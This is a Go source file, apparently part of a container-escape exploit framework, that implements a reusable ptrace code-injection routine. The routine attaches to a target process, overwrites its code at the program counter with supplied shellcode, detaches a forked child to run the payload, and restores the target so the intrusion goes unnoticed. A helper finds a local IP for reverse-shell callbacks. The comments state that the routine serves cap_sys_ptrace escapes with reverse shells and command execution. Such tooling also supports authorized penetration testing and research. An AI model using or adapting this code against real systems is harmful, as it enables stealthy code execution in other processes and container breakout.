// Package ptraceinject provides a reusable ptrace code-injection primitive.
//
// Inject ptrace-attaches to a target process, overwrites the code at the
// program counter with caller-supplied shellcode, lets it run, then restores
// the target's original code and registers so it continues unaffected. The
// shellcode is expected to follow the convention:
//
//	fork(); if (child) { <payload>; exit(0); } else { int3; }
//
// The parent traps via int3 so the injector can restore it; the forked child
// is detached to run the payload freely. This is payload-agnostic: the same
// flow is reused by cap_sys_ptrace escapes (reverse shell, command exec, …).
package ptraceinject

import (
	"fmt"
	"net"
	"runtime"
	"syscall"

	"github.com/ctrsploit/sploit-spec/pkg/log"
	"github.com/ssst0n3/awesome_libs/awesome_error"
)

// Inject ptrace-attaches to pid, overwrites the code at the program counter
// with shellcode, lets it run (the shellcode is expected to fork; the parent
// traps via int3 so it can be restored, the child is detached to run freely),
// then restores the target's original code and registers so it continues
// unaffected. shellcode must follow the convention:
//
//	fork(); if (child) { <payload>; exit(0); } else { int3; }
func Inject(pid int, shellcode []byte) (err error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// 1. Attach to the target process
	err = syscall.PtraceAttach(pid)
	if err != nil {
		err = fmt.Errorf("failed to attach pid: %v", err)
		awesome_error.CheckErr(err)
		return
	}
	defer syscall.PtraceDetach(pid) // Ensure detach happens even on error

	// Wait for the process to stop (it will get a SIGSTOP)
	var ws syscall.WaitStatus
	_, err = syscall.Wait4(pid, &ws, 0, nil)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	log.Logger.Infof("Attached. Process stopped. WaitStatus: %v", ws)

	// Set ptrace options to trace fork events
	err = syscall.PtraceSetOptions(pid, syscall.PTRACE_O_TRACEFORK)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}

	// 2. Save original state (registers)
	var oldRegs syscall.PtraceRegs
	err = syscall.PtraceGetRegs(pid, &oldRegs)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	restoredRegs := oldRegs // Make a copy to modify for restoration later

	// 3. Save original memory content that will be overwritten
	originalCode := make([]byte, len(shellcode))
	_, err = syscall.PtracePeekData(pid, uintptr(getPC(oldRegs)), originalCode)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	log.Logger.Debugf("Original code at RIP (0x%x): %x", getPC(oldRegs), originalCode)

	// 4. Inject shellcode
	_, err = syscall.PtracePokeData(pid, uintptr(getPC(oldRegs)), shellcode)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	log.Logger.Infof("Injected shellcode at RIP (0x%x)", getPC(oldRegs))

	// From here the target's code at RIP has been overwritten. Any early return
	// below must restore originalCode and oldRegs so the target resumes
	// unaffected. The normal path sets restored=true after step 14 to skip
	// this. This defer runs before the PtraceDetach defer (LIFO), so the
	// target is still attached when we restore — which ptrace requires.
	restored := false
	defer func() {
		if restored {
			return
		}
		if _, e := syscall.PtracePokeData(pid, uintptr(getPC(oldRegs)), originalCode); e != nil {
			log.Logger.Errorf("failed to restore original code on error path: %v", e)
		}
		if e := syscall.PtraceSetRegs(pid, &oldRegs); e != nil {
			log.Logger.Errorf("failed to restore registers on error path: %v", e)
		}
	}()

	// 5. Continue process to execute shellcode (fork)
	err = syscall.PtraceCont(pid, 0)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}

	// 6. Wait for the fork event from the parent
	_, err = syscall.Wait4(pid, &ws, 0, nil)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}

	// 7. Handle fork event
	if ws.StopSignal() == syscall.SIGTRAP && ws.TrapCause() == syscall.PTRACE_EVENT_FORK {
		childPid, err := syscall.PtraceGetEventMsg(pid)
		if err != nil {
			awesome_error.CheckErr(err)
			return err
		}
		log.Logger.Infof("Child process forked with PID: %d", childPid)

		// Wait for the child's initial SIGSTOP.
		var childWs syscall.WaitStatus
		_, err = syscall.Wait4(int(childPid), &childWs, 0, nil)
		if err != nil {
			awesome_error.CheckWarning(err)
		} else if childWs.StopSignal() == syscall.SIGSTOP {
			// Now that we have acknowledged the child's SIGSTOP, we can detach.
			err = syscall.PtraceDetach(int(childPid))
			if err != nil {
				err = fmt.Errorf("failed to detach child PID: %d", childPid)
				awesome_error.CheckWarning(err)
			}
		} else {
			log.Logger.Infof("Warning: child stopped with unexpected status: %v", childWs)
		}
	} else {
		err = fmt.Errorf("expected PTRACE_EVENT_FORK, but got: %v", ws)
		awesome_error.CheckErr(err)
		return
	}

	// 8. Continue parent to hit the int3 trap
	err = syscall.PtraceCont(pid, 0)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}

	// 9. Wait for the int3 trap from the parent. The detached child's exit
	// generates a SIGCHLD to the parent (tracee) which can arrive as a
	// signal-delivery-stop before the int3 SIGTRAP — loop past any such
	// intervening stops, re-injecting the signal, until we get the int3.
	for {
		_, err = syscall.Wait4(pid, &ws, 0, nil)
		if err != nil {
			awesome_error.CheckErr(err)
			return
		}
		if !ws.Stopped() {
			err = fmt.Errorf("parent process exited unexpectedly: %v", ws)
			awesome_error.CheckErr(err)
			return
		}
		if ws.StopSignal() == syscall.SIGTRAP && ws.TrapCause() == 0 {
			break // int3 trap
		}
		// Some other signal-delivery-stop (e.g. SIGCHLD from the exited
		// child) — resume, re-injecting the signal so the kernel's signal
		// semantics are preserved, and wait again for the int3.
		if e := syscall.PtraceCont(pid, int(ws.StopSignal())); e != nil {
			err = fmt.Errorf("PtraceCont while waiting for int3 trap: %v", e)
			awesome_error.CheckErr(err)
			return
		}
	}
	log.Logger.Infof("Parent process trapped. WaitStatus: %v", ws)

	// 10. Restore original memory at the original RIP (where we poked shellcode).
	_, err = syscall.PtracePokeData(pid, uintptr(getPC(oldRegs)), originalCode)
	if err != nil {
		err = fmt.Errorf("failed to restore original code: %v", err)
		awesome_error.CheckErr(err)
		return
	}
	log.Logger.Info("Restored original code.")

	// 11. Restore original registers
	err = syscall.PtraceSetRegs(pid, &restoredRegs)
	if err != nil {
		err = fmt.Errorf("failed to restore registers: %v", err)
		awesome_error.CheckErr(err)
		return
	}
	log.Logger.Info("Restored original registers.")
	restored = true
	return
}

// GetIp returns the first non-loopback IPv4 address of the host. It is useful
// for ptrace exploits that need to auto-detect a listener address for a
// reverse shell or callback connection.
func GetIp() (ip string, err error) {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				ip = ipnet.IP.String()
				return
			}
		}
	}
	err = fmt.Errorf("no valid ip address found")
	awesome_error.CheckErr(err)
	return
}
